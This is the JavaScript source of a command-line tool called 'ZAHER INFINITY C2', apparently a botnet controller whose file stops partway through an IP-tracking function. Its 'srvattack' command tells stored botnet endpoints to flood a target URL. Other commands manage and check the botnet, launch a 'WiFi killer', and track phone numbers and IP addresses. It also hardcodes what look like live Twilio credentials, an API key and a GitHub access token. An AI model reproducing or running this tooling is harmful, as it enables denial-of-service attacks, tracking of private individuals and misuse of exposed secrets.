#!/usr/bin/env node

const { exec, spawn  } = require('child_process')
const readline = require('readline')
const url = require('url')
const fs = require('fs')
const axios = require('axios')
const path = require('path')
const version = 'Limited Edition Version v0.x.9'
let processList = [];
// Enhanced color codes
const bold = '\x1b[1m';
const Reset = '\x1b[0m';
const red = '\x1b[38;2;255;50;50m';
const green = '\x1b[38;2;50;255;100m';
const blue = '\x1b[38;2;50;150;255m';
const cyan = '\x1b[38;2;0;255;255m';
const magenta = '\x1b[38;2;255;50;255m';
const yellow = '\x1b[38;2;255;255;50m';
const orange = '\x1b[38;2;255;150;0m';
const purple = '\x1b[38;2;180;70;255m';
const pink = '\x1b[38;2;255;100;200m';
const gold = '\x1b[38;2;255;215;0m';
const silver = '\x1b[38;2;192;192;192m';
const neon_green = '\x1b[38;2;57;255;20m';
const neon_blue = '\x1b[38;2;0;247;255m';
const neon_pink = '\x1b[38;2;255;0;255m';

const bg_black = '\x1b[48;5;0m';
const bg_dark_blue = '\x1b[48;5;18m';
const bg_dark_red = '\x1b[48;5;88m';
const bg_gold = '\x1b[48;5;178m';

const { parsePhoneNumberFromString, getCountryCallingCode } = require('libphonenumber-js');
const carrier = require('libphonenumber-js/metadata.min.json');
const geocoder = require('libphonenumber-js/metadata.min.json');

const permen = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})

// [========================================] //
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// [========================================] //
async function banner() {
  console.clear()
  console.log(`${bold}${cyan}
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║  ${bg_dark_blue}${bold}${gold} ███████╗ █████╗ ██   ██ ███████ ██████   ██████╗ ██████╗ ████████╗ ${Reset}${cyan}  ║
║  ${bg_dark_blue}${bold}${gold} ╚══███╔╝██╔══██╗██  ██  ██      ██   ██ ██╔════╝██╔═══██╗╚══██╔══╝ ${Reset}${cyan}  ║
║  ${bg_dark_blue}${bold}${gold}   ███╔╝ ███████║███████ █████   ██████  ██║     ██║   ██║   ██║    ${Reset}${cyan}  ║
║  ${bg_dark_blue}${bold}${gold}  ███╔╝  ██╔══██║██╔══██ ██╔══╝  ██   ██ ██║     ██║   ██║   ██║    ${Reset}${cyan}  ║
║  ${bg_dark_blue}${bold}${gold} ███████╗██║  ██║██║  ██ ███████╗██║  ██ ╚██████╗╚██████╔╝   ██║    ${Reset}${cyan}  ║
║  ${bg_dark_blue}${bold}${gold} ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝    ╚═╝    ${Reset}${cyan}  ║
║                                                                              ║
║  ${bg_dark_red}${bold}${yellow} ██╗███╗   ██╗███████╗██╗███╗   ██╗██╗████████╗██╗   ██╗${Reset}${cyan}               ║
║  ${bg_dark_red}${bold}${yellow} ██║████╗  ██║██╔════╝██║████╗  ██║██║╚══██╔══╝╚██╗ ██╔╝${Reset}${cyan}               ║
║  ${bg_dark_red}${bold}${yellow} ██║██╔██╗ ██║█████╗  ██║██╔██╗ ██║██║   ██║    ╚████╔╝ ${Reset}${cyan}               ║
║  ${bg_dark_red}${bold}${yellow} ██║██║╚██╗██║██╔══╝  ██║██║╚██╗██║██║   ██║     ╚██╔╝  ${Reset}${cyan}               ║
║  ${bg_dark_red}${bold}${yellow} ██║██║ ╚████║██║     ██║██║ ╚████║██║   ██║      ██║   ${Reset}${cyan}               ║
║  ${bg_dark_red}${bold}${yellow} ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝╚═╝  ╚═══╝╚═╝   ╚═╝      ╚═╝   ${Reset}${cyan}               ║
║                                                                              ║
║  ${gold}╔══════════════════════════════════════════════════════════════════╗${cyan}  ║
║  ${gold}║            ZAHER INFINITY C2 ULTIMATE CONTROLLER               ║${cyan}  ║
║  ${gold}║                    ${silver}Version: ${version}${gold}                     ║${cyan}  ║
║  ${gold}║          ${green}Type ${bold}"help"${Reset}${green} for complete command list${gold}          ║${cyan}  ║
║  ${gold}╚══════════════════════════════════════════════════════════════════╝${cyan}  ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝${Reset}
────────────────────────────────────────────────────────────────────────────────`);
}

// [========================================] //
async function scrapeProxy() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/Aditteji/Security/refs/heads/main/Key');
    const data = await response.text();
    fs.writeFileSync('proxy.txt', data, 'utf-8');
    console.log(`${green}✅ Proxy list successfully updated${Reset}`);
  } catch (error) {
    console.error(`${red}❌ Error fetching proxy data: ${error.message}${Reset}`);
  }
}

// [========================================] //
async function scrapeUserAgent() {
  try {
    const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
    console.log(`${green}✅ User-Agent list successfully updated${Reset}`);
  } catch (error) {
    console.error(`${red}❌ Error fetching user-agent data: ${error.message}${Reset}`);
  }
}

// [========================================] //
function clearProxy() {
  if (fs.existsSync('proxy.txt')) {
    fs.unlinkSync('proxy.txt');
    console.log(`${yellow}🗑️  Proxy file cleared${Reset}`);
  }
}

// [========================================] //
function clearUserAgent() {
  if (fs.existsSync('ua.txt')) {
    fs.unlinkSync('ua.txt');
    console.log(`${yellow}🗑️  User-Agent file cleared${Reset}`);
  }
}

// [========================================] //
async function bootup() {
  try {
    console.log(`${bold}${cyan}╔══════════════════════════════════════════════════════════════════════════════╗${Reset}`);
    console.log(`${bold}${cyan}║                    ${gold}INITIALIZING ZAHER INFINITY C2${cyan}                    ║${Reset}`);
    console.log(`${bold}${cyan}╠══════════════════════════════════════════════════════════════════════════════╣${Reset}`);
    
    console.log(`${blue}│ ${green}▓░░░░░░░░░${blue} │ ${silver}Checking dependencies...${Reset}`);
    await exec(`npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino mineflayer proxy-agent url`)
    
    console.log(`${blue}│ ${green}▓▓░░░░░░░░${blue} │ ${silver}Verifying version...${Reset}`);
    const getLatestVersion = await fetch('https://raw.githubusercontent.com/FdilzXDilzX/SecreT82-4-02-3-kebdoanebxiananrodba-3-_9-495-29174840-_-gkxHere/refs/heads/main/Version.txt');
    const latestVersion = await getLatestVersion.text()
    
    console.log(`${blue}│ ${green}▓▓▓░░░░░░░${blue} │ ${silver}Version check complete${Reset}`);
    
    if (version === latestVersion.trim()) {
      console.log(`${blue}│ ${green}▓▓▓▓▓▓░░░░${blue} │ ${silver}Loading security module...${Reset}`);
      
      const secretBangetJir = await fetch('https://raw.githubusercontent.com/Vavannak/ZaherinfinityC2/refs/heads/main/zaherinfinityC2.txt?token=GHSAT0AAAAAADSIKK5KQT4APJF5MNLLP6YI2KY7NGQ');
      const password = await secretBangetJir.text();
      
      console.log(`${bold}${cyan}╠══════════════════════════════════════════════════════════════════════════════╣${Reset}`);
      console.log(`${bold}${cyan}║                         ${gold}AUTHENTICATION REQUIRED${cyan}                         ║${Reset}`);
      console.log(`${bold}${cyan}╚══════════════════════════════════════════════════════════════════════════════╝${Reset}`);
      
      permen.question(`${bg_gold}${red}🔐 ENTER ACCESS KEY: ${Reset}`, async (skibidi) => {
        if (skibidi === password.trim()) {
          console.log(`${bold}${neon_green}╔══════════════════════════════════════════════════════════════════════════════╗${Reset}`);
          console.log(`${bold}${neon_green}║                ✅ ACCESS GRANTED - WELCOME TO ZAHER INFINITY C2              ║${Reset}`);
          console.log(`${bold}${neon_green}╚══════════════════════════════════════════════════════════════════════════════╝${Reset}`);
          
          console.log(`${blue}│ ${green}▓▓▓▓▓▓▓░░░${blue} │ ${silver}Updating proxy list...${Reset}`);
          await scrapeProxy()
          
          console.log(`${blue}│ ${green}▓▓▓▓▓▓▓▓▓▓${blue} │ ${silver}Updating user-agent list...${Reset}`);
          await scrapeUserAgent()
          
          console.log(`${bold}${cyan}╔══════════════════════════════════════════════════════════════════════════════╗${Reset}`);
          console.log(`${bold}${cyan}║                    ${gold}SYSTEM INITIALIZATION COMPLETE${cyan}                    ║${Reset}`);
          console.log(`${bold}${cyan}╚══════════════════════════════════════════════════════════════════════════════╝${Reset}`);
          
          await sleep(700)
          console.clear()
          await banner()
          console.log(`${green}📖 Type ${bold}"help"${Reset}${green} to view all available commands${Reset}`);
          sigma()
        } else {
          console.log(`${red}╔══════════════════════════════════════════════════════════════════════════════╗${Reset}`);
          console.log(`${red}║                    ❌ INVALID ACCESS KEY - SYSTEM LOCKED                    ║${Reset}`);
          console.log(`${red}╚══════════════════════════════════════════════════════════════════════════════╝${Reset}`);
          process.exit(-1);
        }
      }) 
    } else {
      console.log(`${yellow}╔══════════════════════════════════════════════════════════════════════════════╗${Reset}`);
      console.log(`${yellow}║                      ⚠ VERSION UPDATE AVAILABLE                            ║${Reset}`);
      console.log(`${yellow}║         ${silver}Current: ${version} → Latest: ${latestVersion.trim()}${yellow}               ║${Reset}`);
      console.log(`${yellow}╚══════════════════════════════════════════════════════════════════════════════╝${Reset}`);
      
      console.log(`${cyan}⏳ Initiating auto-update sequence...${Reset}`);
      await exec(`npm uninstall -g prmnmd-tuls`)
      console.log(`${green}📦 Installing updated version...${Reset}`);
      await exec(`npm i -g prmnmd-tuls`)
      console.log(`${bold}${green}✅ Update complete. Please restart the application.${Reset}`)
      process.exit()
    }
  } catch (error) {
    console.log(`${red}╔══════════════════════════════════════════════════════════════════════════════╗${Reset}`);
    console.log(`${red}║                        ❌ NETWORK CONNECTION ERROR                         ║${Reset}`);
    console.log(`${red}║                   Please check your internet connection                    ║${Reset}`);
    console.log(`${red}╚══════════════════════════════════════════════════════════════════════════════╝${Reset}`);
  }
}

// [========================================] //
async function killWifi() {
  const wifiPath = path.join(__dirname, `/lib/cache/WiFi`);
  const startKillwiFi = spawn('node', [wifiPath]);
  
  console.log(`${bold}${cyan}
╔══════════════════════════════════════════════════════════════════════════════╗
║                         ${red}WIFI KILLER ACTIVATED${cyan}                         ║
╠══════════════════════════════════════════════════════════════════════════════╣
║ ${yellow}⚠  WARNING: This tool is for authorized penetration testing only          ${cyan}║
║ ${yellow}⚠  Type 'exit' to stop the attack                                         ${cyan}║
╚══════════════════════════════════════════════════════════════════════════════╝${Reset}
`);

  permen.question(`${bg_dark_red}${bold}${yellow}ZA∞ER${Reset} ${cyan}»${Reset} ${bg_dark_blue}${bold}${neon_green}WiFi-KILL${Reset}: `, async (yakin) => {
    if (yakin === 'exit') {
      startKillwiFi.kill('SIGKILL')
      console.log(`${red}╔══════════════════════════════════════════════════════════════════════════════╗${Reset}`);
      console.log(`${red}║                        ✖ WIFI KILLER TERMINATED                           ║${Reset}`);
      console.log(`${red}╚══════════════════════════════════════════════════════════════════════════════╝${Reset}`);
      sigma()
    } else {
      console.log(`${yellow}⚠ Do you mean 'exit'?${Reset}`)
      sigma()
    }
  })
}

// [========================================] //
async function AttackBotnetEndpoints(args) {
  if (args.length < 3) {
    console.log(`${bold}${cyan}╔══════════════════════════════════════════════════════════════════════════════╗${Reset}`);
    console.log(`${bold}${cyan}║                          ${red}INVALID SYNTAX${cyan}                             ║${Reset}`);
    console.log(`${bold}${cyan}╠══════════════════════════════════════════════════════════════════════════════╣${Reset}`);
    console.log(`${bold}${cyan}║ ${yellow}Usage: srvattack <target> <duration> <method>${cyan}                       ║${Reset}`);
    console.log(`${bold}${cyan}║ ${silver}Example: srvattack https://target.com 120 flood${cyan}                    ║${Reset}`);
    console.log(`${bold}${cyan}╚══════════════════════════════════════════════════════════════════════════════╝${Reset}`);
    sigma();
    return;
  }
  
  const [target, duration, methods] = args;
  let result;
  
  try {
    const parsing = new url.URL(target);
    const hostname = parsing.hostname;
    const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);
    result = scrape.data;
    
    console.clear();
    console.log(`${bold}${cyan}
╔══════════════════════════════════════════════════════════════════════════════╗
║                     ${gold}DISTRIBUTED SERVER ATTACK${cyan}                     ║
╠══════════════════════════════════════════════════════════════════════════════╣
║ ${neon_green}Attack command sent to all available botnet servers${cyan}                 ║
╚══════════════════════════════════════════════════════════════════════════════╝${Reset}

${bold}${purple}📡 ATTACK PARAMETERS${Reset}
 ${blue}├─${Reset} ${silver}Target URL:${Reset} ${green}${target}${Reset}
 ${blue}├─${Reset} ${silver}Duration:${Reset} ${yellow}${duration} seconds${Reset}
 ${blue}├─${Reset} ${silver}Method:${Reset} ${red}${methods}${Reset}
 ${blue}├─${Reset} ${silver}Protocol:${Reset} ${cyan}HTTPS${Reset}
 ${blue}└─${Reset} ${silver}Concurrent:${Reset} ${neon_green}Multi-Server${Reset}

${bold}${purple}🌐 TARGET INFORMATION${Reset}
 ${blue}├─${Reset} ${silver}IP Address:${Reset} ${neon_blue}${result.query}${Reset}
 ${blue}├─${Reset} ${silver}ISP Provider:${Reset} ${cyan}${result.isp}${Reset}
 ${blue}└─${Reset} ${silver}AS Number:${Reset} ${yellow}${result.as}${Reset}

${cyan}Type ${bold}"cls"${Reset}${cyan} to clear terminal${Reset}
────────────────────────────────────────────────────────────────────────────────`);
    sigma();
  } catch (error) {
    console.error(`${red}❌ Error retrieving target information: ${error.message}${Reset}`);
  }

  let botnetData;
  let successCount = 0;
  const timeout = 20000;
  const validEndpoints = [];

  // Load botnet data
  try {
    botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
  } catch (error) {
    console.error(`${red}❌ Error loading botnet data: ${error.message}${Reset}`);
    botnetData = { endpoints: [] };
  }

  // Send requests to each endpoint
  const requests = botnetData.endpoints.map(async (endpoint) => {
    const apiUrl = `${endpoint}?target=${target}&time=${duration}&methods=${methods}`;

    try {
      const response = await axios.get(apiUrl, { timeout });
      if (response.status === 200) {
        successCount++;
        validEndpoints.push(endpoint);
      }
    } catch (error) {
      console.error(`${red}❌ Error sending request to ${endpoint}: ${error.message}${Reset}`);
    }
  });

  await Promise.all(requests);

  // Save valid endpoints back to the file
  botnetData.endpoints = validEndpoints;
  try {
    fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
  } catch (error) {
    console.error(`${red}❌ Error saving botnet data: ${error.message}${Reset}`);
    sigma();
  }
}

// [========================================] //
async function processBotnetEndpoint(args) {
  if (args.length < 1) {
    console.log(`${bold}${cyan}╔══════════════════════════════════════════════════════════════════════════════╗${Reset}`);
    console.log(`${bold}${cyan}║                          ${red}INVALID SYNTAX${cyan}                             ║${Reset}`);
    console.log(`${bold}${cyan}╠══════════════════════════════════════════════════════════════════════════════╣${Reset}`);
    console.log(`${bold}${cyan}║ ${yellow}Usage: addsrv <endpoint_url>${cyan}                                    ║${Reset}`);
    console.log(`${bold}${cyan}║ ${silver}Example: addsrv http://1.1.1.1:2000/permen${cyan}                     ║${Reset}`);
    console.log(`${bold}${cyan}╚══════════════════════════════════════════════════════════════════════════════╝${Reset}`);
    sigma();
    return;
  }
  
  try {
    const parsedUrl = new url.URL(args);
    const hostt = parsedUrl.host;
    const endpoint = 'http://' + hostt + '/permen';

    // Load botnet data
    let botnetData;
    try {
      const data = await fs.promises.readFile('./lib/botnet.json', 'utf8');
      botnetData = JSON.parse(data);
    } catch (error) {
      console.error(`${red}❌ Error loading botnet data: ${error.message}${Reset}`);
      botnetData = { endpoints: [] };
    }

    // Check if endpoint already exists
    if (botnetData.endpoints.includes(endpoint)) {
      console.log(`${yellow}╔══════════════════════════════════════════════════════════════════════════════╗${Reset}`);
      console.log(`${yellow}║                          ⚠ DUPLICATE ENTRY${cyan}                             ║${Reset}`);
      console.log(`${yellow}╠══════════════════════════════════════════════════════════════════════════════╣${Reset}`);
      console.log(`${yellow}║ ${silver}Endpoint already exists in botnet list${cyan}                           ║${Reset}`);
      console.log(`${yellow}║ ${neon_blue}${endpoint}${cyan}${' '.repeat(65 - endpoint.length)}║${Reset}`);
      console.log(`${yellow}╚══════════════════════════════════════════════════════════════════════════════╝${Reset}`);
      sigma();
      return;
    }

    // Add endpoint and save data
    botnetData.endpoints.push(endpoint);
    try {
      await fs.promises.writeFile('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
    } catch (error) {
      console.error(`${red}❌ Error saving botnet data: ${error.message}${Reset}`);
      console.log(`${red}Failed to save botnet data.${Reset}`);
      sigma();
      return;
    }

    // Success message
    console.log(`${green}╔══════════════════════════════════════════════════════════════════════════════╗${Reset}`);
    console.log(`${green}║                          ✅ SERVER ADDED${cyan}                              ║${Reset}`);
    console.log(`${green}╠══════════════════════════════════════════════════════════════════════════════╣${Reset}`);
    console.log(`${green}║ ${neon_green}Endpoint successfully added to botnet list${cyan}                     ║${Reset}`);
    console.log(`${green}║ ${neon_blue}${endpoint}${cyan}${' '.repeat(65 - endpoint.length)}║${Reset}`);
    console.log(`${green}╚══════════════════════════════════════════════════════════════════════════════╝${Reset}`);
    
    sigma();
  } catch (error) {
    console.error(`${red}❌ Error processing endpoint: ${error.message}${Reset}`);
    console.log(`${red}An error occurred while processing the endpoint.${Reset}`);
    sigma();
  }
}

// [========================================] //
async function getIPAddress(target) {
  try {
    const parsing = new url.URL(target);
    const hostname = parsing.hostname;
    const response = await axios.get(`http://ip-api.com/json/${hostname}?fields=query`);

    if (response.data && response.data.status === "success") {
      return response.data.query;
    } else {
      return target;
    }
  } catch (error) {
    console.error(`${red}❌ Error fetching IP address: ${error}${Reset}`);
    return target;
  }
}

// [========================================] //
async function monitorOngoingAttacks() {
  // Filter processes that are still running
  processList = processList.filter((process) => {
    const remaining = Math.max(0, Math.floor((process.endTime - Date.now()) / 1000));
    return remaining > 0;
  });

  if (processList.length === 0) {
    console.log(`${bold}${cyan}╔══════════════════════════════════════════════════════════════════════════════╗${Reset}`);
    console.log(`${bold}${cyan}║                         ${silver}NO ACTIVE ATTACKS${cyan}                         ║${Reset}`);
    console.log(`${bold}${cyan}╠══════════════════════════════════════════════════════════════════════════════╣${Reset}`);
    console.log(`${bold}${cyan}║ ${yellow}There are no ongoing attacks at the moment${cyan}                        ║${Reset}`);
    console.log(`${bold}${cyan}╚══════════════════════════════════════════════════════════════════════════════╝${Reset}`);
    sigma();
    return;
  }

  // Create attack table
  let attackDetails = `${bold}${neon_blue}
╔══════════════════════════════════════════════════════════════════════════════╗
║                     ${gold}ACTIVE ATTACKS MONITOR${neon_blue}                       ║
╠════════╦══════════════════════════╦════════╦══════════╦════════════════╣
║ ${silver}INDEX${neon_blue}  ║        ${silver}TARGET${neon_blue}         ║ ${silver}ELAPSED${neon_blue} ║ ${silver}DURATION${neon_blue} ║    ${silver}METHOD${neon_blue}    ║
╠════════╬══════════════════════════╬════════╬══════════╬════════════════╣\n`;

  // Fill table with process data
  processList.forEach((process, index) => {
    const host = process.ip || process.target;
    const since = Math.floor((Date.now() - process.startTime) / 1000);
    const duration = `${process.duration}s`;
    const num = String(index + 1).padEnd(2);
    const truncatedHost = host.length > 20 ? host.substring(0, 17) + '...' : host;
    
    // Method color coding
    let methodColor = green;
    if (process.methods.includes('kill') || process.methods.includes('destroy')) methodColor = red;
    else if (process.methods.includes('tls') || process.methods.includes('bypass')) methodColor = cyan;
    else if (process.methods.includes('flood') || process.methods.includes('storm')) methodColor = yellow;
    else if (process.methods.includes('bomber') || process.methods.includes('nuke')) methodColor = magenta;

    attackDetails += `${neon_blue}║ ${neon_green}${num}${neon_blue}     ║ ${silver}${truncatedHost.padEnd(22)}${neon_blue} ║ ${orange}${String(since).padEnd(6)}${neon_blue}s ║ ${yellow}${duration.padEnd(8)}${neon_blue} ║ ${methodColor}${process.methods.padEnd(14)}${neon_blue} ║\n`;
  });

  // Table bottom
  attackDetails += `${neon_blue}╚════════╩══════════════════════════╩════════╩══════════╩════════════════╝${Reset}\n`;

  console.log(attackDetails);
  sigma();
}

// [========================================] //
async function checkBotnetEndpoints() {
  let botnetData;
  let successCount = 0;
  const timeout = 20000;
  const validEndpoints = [];

  // Load botnet data
  try {
    botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
  } catch (error) {
    console.error(`${red}❌ Error loading botnet data: ${error.message}${Reset}`);
    botnetData = { endpoints: [] };
  }

  console.log(`${bold}${cyan}╔══════════════════════════════════════════════════════════════════════════════╗${Reset}`);
  console.log(`${bold}${cyan}║                        ${gold}BOTNET SERVER CHECK${cyan}                         ║${Reset}`);
  console.log(`${bold}${cyan}╠══════════════════════════════════════════════════════════════════════════════╣${Reset}`);
  console.log(`${bold}${cyan}║ ${silver}Checking ${yellow}${botnetData.endpoints.length}${silver} available servers...${cyan}${' '.repeat(27)}║${Reset}`);
  console.log(`${bold}${cyan}╚══════════════════════════════════════════════════════════════════════════════╝${Reset}`);

  // Send requests to each endpoint
  const requests = botnetData.endpoints.map(async (endpoint, index) => {
    const apiUrl = `${endpoint}?target=https://google.com&time=1&methods=ninja`;

    try {
      const response = await axios.get(apiUrl, { timeout });
      if (response.status === 200) {
        successCount++;
        validEndpoints.push(endpoint);
        console.log(`${green}✅ Server ${index + 1}: ${endpoint} - ONLINE${Reset}`);
      }
    } catch (error) {
      console.log(`${red}❌ Server ${index + 1}: ${endpoint} - OFFLINE${Reset}`);
    }
  });

  await Promise.all(requests);
  botnetData.endpoints = validEndpoints;
  
  try {
    fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
  } catch (error) {
    console.error(`${red}❌ Error saving server data: ${error.message}${Reset}`);
    sigma();
  }

  // Results
  console.log(`${bold}${cyan}╔══════════════════════════════════════════════════════════════════════════════╗${Reset}`);
  console.log(`${bold}${cyan}║                        ${gold}SERVER CHECK COMPLETE${cyan}                        ║${Reset}`);
  console.log(`${bold}${cyan}╠══════════════════════════════════════════════════════════════════════════════╣${Reset}`);
  console.log(`${bold}${cyan}║ ${neon_green}${successCount}${silver} servers online | ${red}${botnetData.endpoints.length - successCount}${silver} servers offline${cyan}${' '.repeat(23)}║${Reset}`);
  console.log(`${bold}${cyan}╚══════════════════════════════════════════════════════════════════════════════╝${Reset}`);
  
  sigma();
}

// [========================================] //
async function TrackNumber(args) {
  if (args.length < 1) {
    console.log(`${bold}${cyan}╔══════════════════════════════════════════════════════════════════════════════╗${Reset}`);
    console.log(`${bold}${cyan}║                          ${red}INVALID SYNTAX${cyan}                             ║${Reset}`);
    console.log(`${bold}${cyan}╠══════════════════════════════════════════════════════════════════════════════╣${Reset}`);
    console.log(`${bold}${cyan}║ ${yellow}Usage: TrackNumber <phone_number>${cyan}                              ║${Reset}`);
    console.log(`${bold}${cyan}║ ${silver}Example: TrackNumber 6281234567890${cyan}                             ║${Reset}`);
    console.log(`${bold}${cyan}╚══════════════════════════════════════════════════════════════════════════════╝${Reset}`);
    sigma();
    return;
  }
  
  try {
    const phone = args[0];
    const defaultRegion = 'ID';
    const phoneNumber = parsePhoneNumberFromString(phone, defaultRegion);

    if (!phoneNumber) {
      console.log(`${red}❌ Invalid phone number format.${Reset}`);
      sigma();
      return;
    }

    // Parsing information
    const regionCode = phoneNumber.country;
    const countryCode = getCountryCallingCode(regionCode);
    const formattedInternational = phoneNumber.formatInternational();
    const formattedE164 = phoneNumber.format('E.164');
    const nationalNumber = phoneNumber.nationalNumber;

    // Validation
    const isValidNumber = phoneNumber.isValid();
    const isPossibleNumber = phoneNumber.isPossible();
    
    // Carrier, location info
    const provider = carrier[regionCode] ? carrier[regionCode].name : 'Unknown';
    const location = geocoder[regionCode] ? geocoder[regionCode].location : 'Unknown';
    
    // City info
    const city = getCityFromNumber(nationalNumber);
    
    // WhatsApp status
    const isWhatsAppUser = await checkWhatsAppUserTwilio(formattedE164);

    console.log(`${bold}${cyan}
╔══════════════════════════════════════════════════════════════════════════════╗
║                      ${gold}PHONE NUMBER INTELLIGENCE${cyan}                      ║
╠══════════════════════════════════════════════════════════════════════════════╣
║ ${neon_green}Detailed analysis of target phone number${cyan}                           ║
╚══════════════════════════════════════════════════════════════════════════════╝${Reset}

${bold}${purple}📱 BASIC INFORMATION${Reset}
 ${blue}├─${Reset} ${silver}Phone Number:${Reset} ${green}${phone}${Reset}
 ${blue}├─${Reset} ${silver}Country:${Reset} ${yellow}${location}${Reset}
 ${blue}├─${Reset} ${silver}Region Code:${Reset} ${cyan}${regionCode}${Reset}
 ${blue}├─${Reset} ${silver}City:${Reset} ${neon_green}${city}${Reset}
 ${blue}└─${Reset} ${silver}Carrier:${Reset} ${purple}${provider}${Reset}

${bold}${purple}🔍 VALIDATION STATUS${Reset}
 ${blue}├─${Reset} ${silver}Valid Number:${Reset} ${isValidNumber ? green+'✅ Yes' : red+'❌ No'}${Reset}
 ${blue}├─${Reset} ${silver}Possible Number:${Reset} ${isPossibleNumber ? green+'✅ Yes' : red+'❌ No'}${Reset}
 ${blue}└─${Reset} ${silver}WhatsApp Status:${Reset} ${isWhatsAppUser ? green+'✅ Registered' : red+'❌ Not Registered'}${Reset}

${bold}${purple}📞 NUMBER FORMATS${Reset}
 ${blue}├─${Reset} ${silver}International:${Reset} ${neon_blue}${formattedInternational}${Reset}
 ${blue}├─${Reset} ${silver}E.164 Format:${Reset} ${purple}${formattedE164}${Reset}
 ${blue}├─${Reset} ${silver}Country Code:${Reset} ${gold}+${countryCode}${Reset}
 ${blue}└─${Reset} ${silver}Local Number:${Reset} ${silver}${nationalNumber}${Reset}

${bold}${purple}📊 ADDITIONAL DETAILS${Reset}
 ${blue}├─${Reset} ${silver}Number Type:${Reset} ${phoneNumber.getType() === 'MOBILE' ? cyan+'📱 Mobile' : yellow+'🏠 Fixed Line'}${Reset}
 ${blue}└─${Reset} ${silver}Time Zone:${Reset} ${orange}GMT+7 (WIB)${Reset}
`);
    sigma();
  } catch (error) {
    console.log(`${red}❌ Error tracking phone number: ${error.message}${Reset}`);
    sigma();
  }
}

// [========================================] //
function getCityFromNumber(nationalNumber) {
  const prefixCityMap = {
    '21': 'Jakarta',
    '22': 'Bandung',
    '31': 'Surabaya',
    '24': 'Semarang',
    '61': 'Medan',
    '81': 'Padang',
    '74': 'Jambi',
    '27': 'Yogyakarta',
    '33': 'Bali',
  };
  const prefix = nationalNumber.substring(0, 2);
  return prefixCityMap[prefix] || 'Unknown City';
}

// [========================================] //
async function checkWhatsAppUserTwilio(formattedE164) {
  const accountSid = 'ACba24371f132181e8b489ea85010ed161';
  const authToken = 'd60be9af6cfce4d7ef1d229b7dbb1f8e';
  const client = require('twilio')(accountSid, authToken);

  try {
    const message = await client.messages.create({
      body: 'Hello from Twilio!',
      from: 'whatsapp:6287805350931',
      to: `whatsapp:${formattedE164}`
    });
    return true;
  } catch (error) {
    return false;
  }
}

// [========================================] //
async function trackIP(args) {
  if (args.length < 1) {
    console.log(`${bold}${cyan}╔══════════════════════════════════════════════════════════════════════════════╗${Reset}`);
    console.log(`${bold}${cyan}║                          ${red}INVALID SYNTAX${cyan}                             ║${Reset}`);
    console.log(`${bold}${cyan}╠══════════════════════════════════════════════════════════════════════════════╣${Reset}`);
    console.log(`${bold}${cyan}║ ${yellow}Usage: track-ip <ip_address>${cyan}                                   ║${Reset}`);
    console.log(`${bold}${cyan}║ ${silver}Example: track-ip 1.1.1.1${cyan}                                      ║${Reset}`);
    console.log(`${bold}${cyan}╚══════════════════════════════════════════════════════════════════════════════╝${Reset}`);
    sigma();
    return;
  }
  
  const [target] = args;
  
  if (target === '0.0.0.0') {
    console.log(`${red}╔══════════════════════════════════════════════════════════════════════════════╗${Reset}`);
    console.log(`${red}║                          ⚠ SECURITY WARNING${cyan}                           ║${Reset}`);
    console.log(`${red}╠══════════════════════════════════════════════════════════════════════════════╣${Reset}`);
    console.log(`${red}║ ${yellow}Unauthorized tracking attempts will result in account suspension${cyan}         ║${Reset}`);
    console.log(`${red}╚══════════════════════════════════════════════════════════════════════════════╝${Reset}`);
    sigma();
    return;
  }
  
  try {
    const apiKey = '8fd0a436e74f44a7a3f94edcdd71c696';
    const response = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${target}`);
    const res = await fetch(`https://ipwho.is/${target}`);
    const additionalInfo = await res.json();
    const ipInfo = await response.json();

    console.clear();
    console.log(`${bold}${cyan}
╔══════════════════════════════════════════════════════════════════════════════╗
║                        ${gold}IP GEO-LOCATION TRACKING${cyan}                      ║
╠══════════════════════════════════════════════════════════════════════════════╣
║ ${neon_green}Complete geographical and network information for target IP${cyan}           ║
╚══════════════════════════════════════════════════════════════════════════════╝${Reset}

${bold}${purple}🌍 GEOGRAPHICAL DATA${Reset}
 ${blue}├─${Reset} ${silver}IP Address:${Reset} ${green}${target}${Reset}
 ${blue}├─${Reset} ${silver}Country:${Reset} ${yellow}${ipInfo.country_name} ${ipInfo.country_flag}${Reset}
 ${blue}├─${Reset} ${silver}Capital:${Reset} ${cyan}${ipInfo.country_capital}${Reset}
 ${blue}├─${Reset} ${silver}City:${Reset} ${neon_green}${ipInfo.city}${Reset}
 ${blue}├─${Reset} ${silver}Region:${Reset} ${purple}${ipInfo.state_prov}${Reset}
 ${blue}├─${Reset} ${silver}Latitude:${Reset} ${orange}${ipInfo.latitude}°${Reset}
 ${blue}└─${Reset} ${silver}Longitude:${Reset} ${orange}${ipInfo.longitude}°${Reset}

${bold}${purple}📡 NETWORK INFORMATION${Reset}
 ${blue}├─${Reset} ${silver}ISP Provider:${Reset} ${neon_blue}${ipInfo.isp}${Reset}
 ${blue}├─${Reset} ${silver}Organization:${Reset} ${silver}${ipInfo.organization}${Reset}
 ${blue}├─${Reset} ${silver}AS Number:${Reset} ${yellow}${ipInfo.asn}${Reset}
 ${blue}├─${Reset} ${silver}Timezone:${Reset} ${cyan}${ipInfo.time_zone.name} (UTC${ipInfo.time_zone.offset})${Reset}
 ${blue}└─${Reset} ${silver}Currency:${Reset} ${green}${ipInfo.currency.code} (${ipInfo.currency.name})${Reset}

